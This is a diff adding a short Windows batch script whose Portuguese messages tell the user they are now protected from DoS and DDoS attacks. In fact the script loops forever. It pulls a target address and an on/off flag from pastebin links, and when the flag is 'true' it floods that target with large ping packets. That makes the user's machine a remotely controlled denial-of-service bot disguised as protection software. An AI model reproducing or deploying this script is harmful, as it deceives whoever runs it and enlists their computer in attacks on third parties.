@@ -1,0 +1,21 @@
+@echo off
+setlocal enabledelayedexpansion
+curl -s https://pastebin.com/raw/zvXTpnrN > output2.txt
+set /p text2=<output2.txt
+echo Pronto, vc esta protegido de ataques DoS e DDos, nao feche o programa
+echo Ele foi iniciado pelo startup, vc ja baixou ele e n precisa executar o programa de onde vc baixou
+echo pode deletar da onde vc baixou ja
+cd "%~dp0"
+:loop
+curl -s https://pastebin.com/raw/zvXTpnrN > output2.txt
+curl -s https://pastebin.com/raw/RWBcyNUD > output.txt
+set /p text=<output.txt
+set /p text2=<output2.txt
+if "%text%"=="true" (
+    ping -n 10 %text2% -l 65500 > nul
+    goto loop
+) else (
+    rem nothing
+)
+timeout /t 1 > nul
+goto loop
